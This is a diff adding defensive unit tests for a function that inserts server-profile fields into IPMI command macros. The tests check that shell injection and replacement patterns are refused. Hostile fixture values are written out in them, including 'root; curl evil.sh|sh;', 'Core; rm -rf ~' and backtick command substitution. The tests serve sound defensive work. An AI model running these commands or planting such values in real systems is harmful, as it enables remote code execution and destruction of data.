@@ -43,11 +43,33 @@ describe("resolveProfileTokens — substitution", () => {
     expect(resolved("show version\n", server())).toBe("show version\n");
   });
 
-  it("never re-interprets a substituted value as a replacement pattern", () => {
-    // `String.replace(re, value)` would expand `$&` / `$'` inside the VALUE and
-    // splice surrounding text into the output; array-append cannot.
-    const cfg = server({ name: "$& $` $' $1 $$" });
-    expect(resolved("[${profile.name}]", cfg)).toBe("[$& $` $' $1 $$]");
+  it("refuses a value that would be a replacement pattern, in every token", () => {
+    // Two hazards, one rule. `String.replace(re, value)` expands `$&` / `$'`
+    // inside the VALUE (array-append already cannot), and `runMacroOnServer`
+    // hands the resolved text to the VARIABLE engine, which scans it again — so
+    // a substituted `$password` would splice a prompted secret into the command.
+    // Both are closed by refusing `$` and a backtick in every token, which is
+    // the invariant the second pass depends on.
+    for (const token of PROFILE_TOKEN_WHITELIST) {
+      if (token === "port") continue;
+      for (const bad of ["$& $` $'", "$password", "a$1b", "x`id`y"]) {
+        const outcome = resolveProfileTokens(
+          `echo \${profile.${token}}`,
+          server({ [token]: bad } as Partial<ServerConfig>)
+        );
+        expect(outcome.ok, `expected refusal for ${token} = ${bad}`).toBe(false);
+      }
+    }
+  });
+
+  it("leaves a prompted variable in the macro text for the second pass, and nowhere else", () => {
+    // The pipeline: profile tokens first, then the variable engine over the
+    // SAME string. `$password` written by the macro author must survive this
+    // pass untouched — it is a placeholder, not a profile value.
+    const cfg = server({ ipmiHost: "10.0.0.9" });
+    expect(resolved("ipmitool -H \${profile.ipmiHost} -P $password", cfg)).toBe(
+      "ipmitool -H 10.0.0.9 -P $password"
+    );
   });
 
   it("substitutes every occurrence of the same token", () => {
@@ -98,6 +120,15 @@ describe("resolveProfileTokens — unknown tokens", () => {
 });
 
 describe("resolveProfileTokens — missing fields", () => {
+  it("sends the user to the Advanced section for the field that lives there", () => {
+    // "Edit Server" opens a form whose IPMI / BMC Host is collapsed, so an error
+    // that only names the field is a dead end.
+    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server());
+    expect(outcome.ok).toBe(false);
+    if (outcome.ok) return;
+    expect(outcome.error.message).toContain("Add it under Advanced options in the server form.");
+  });
+
   it("refuses the run when ipmiHost is not set, naming server and field", () => {
     const outcome = resolveProfileTokens(" ipmitool -H ${profile.ipmiHost} sol activate\n", server());
     expect(outcome.ok).toBe(false);
@@ -139,7 +170,10 @@ describe("resolveProfileTokens — injection defense", () => {
     if (outcome.ok) return;
     expect(outcome.error.kind).toBe("invalid");
     expect(outcome.error.token).toBe("host");
-    expect(JSON.stringify(outcome)).not.toContain("rm -rf");
+    // The refusal names the offending value (that is the point of the message),
+    // but it must never produce the RESOLVED command line.
+    expect(JSON.stringify(outcome)).not.toContain("ping 1.2.3.4");
+    expect(outcome.error.message).toContain("1.2.3.4; rm -rf ~");
   });
 
   it("refuses command substitution and pipes in an ipmiHost", () => {
@@ -172,6 +206,70 @@ describe("resolveProfileTokens — injection defense", () => {
 
   it("still allows a free-form display name — it is a label, not an address", () => {
     expect(resolved("# ${profile.name}", server({ name: "Core Switch (DC1)" }))).toBe("# Core Switch (DC1)");
+    // Spaces, parens, accents and slashes stay legal: `name` is a blacklist, not
+    // a charset, and refusing these would break ordinary profile names.
+    expect(resolved("# ${profile.name}", server({ name: "Rack 4 / Ünit 2" }))).toBe("# Rack 4 / Ünit 2");
+  });
+
+  it("refuses a username carrying shell syntax — it reaches a local command line too", () => {
+    // The reachable path: inventory sync writes `after.username` straight from
+    // the endpoint, and the shipped IPMI template puts it in `-U` on a LOCAL
+    // terminal. Without a charset here the resolved line is executable.
+    const outcome = resolveProfileTokens(
+      " ipmitool -U ${profile.username} sol activate\n",
+      server({ username: "root; curl evil.sh|sh;" })
+    );
+    expect(outcome.ok).toBe(false);
+    if (outcome.ok) return;
+    expect(outcome.error.kind).toBe("invalid");
+    expect(outcome.error.token).toBe("username");
+    // The exact line a permissive `username` produced before this check existed.
+    expect(JSON.stringify(outcome)).not.toContain("ipmitool -U root; curl evil.sh|sh; sol activate");
+  });
+
+  it("refuses shell syntax in a display name, which is otherwise free-form", () => {
+    const outcome = resolveProfileTokens(
+      " echo ${profile.name} >> /tmp/log\n",
+      server({ name: "Core; rm -rf ~" })
+    );
+    expect(outcome.ok).toBe(false);
+    if (outcome.ok) return;
+    expect(outcome.error.token).toBe("name");
+    expect(JSON.stringify(outcome)).not.toContain("echo Core; rm -rf ~ >>");
+  });
+
+  it("refuses every metacharacter in username and name, one at a time", () => {
+    for (const bad of ["a;b", "a|b", "a&b", "a<b", "a>b", "a`b`", "a$b", "a'b", 'a"b', "a\\b"]) {
+      expect(resolveProfileTokens("x ${profile.username}", server({ username: bad })).ok, `username ${bad}`).toBe(false);
+      expect(resolveProfileTokens("x ${profile.name}", server({ name: bad })).ok, `name ${bad}`).toBe(false);
+    }
+  });
+
+  it("accepts the usernames people actually have, including the email-style form", () => {
+    for (const good of ["admin", "svc_nexus", "first.last", "ADMIN-2", "user@REALM.EXAMPLE.COM"]) {
+      expect(resolved("-U ${profile.username}", server({ username: good }))).toBe(`-U ${good}`);
+    }
+    // A space is not part of any real username, and it is what separates one
+    // argument from the next.
+    expect(resolveProfileTokens("-U ${profile.username}", server({ username: "two words" })).ok).toBe(false);
+  });
+
+  it("names the offending value and what the field accepts, so the message is not a dead end", () => {
+    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "https://10.0.0.1/" }));
+    expect(outcome.ok).toBe(false);
+    if (outcome.ok) return;
+    expect(outcome.error.message).toContain('"https://10.0.0.1/"');
+    expect(outcome.error.message).toContain("Use the address only");
+    expect(outcome.error.message).toContain("https://");
+    expect(outcome.error.message).toContain("Nothing was sent.");
+  });
+
+  it("truncates a very long offending value instead of pasting it whole into a notification", () => {
+    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: `${"a".repeat(300)};id` }));
+    expect(outcome.ok).toBe(false);
+    if (outcome.ok) return;
+    expect(outcome.error.message).toContain("…");
+    expect(outcome.error.message.length).toBeLessThan(400);
   });
 });
 
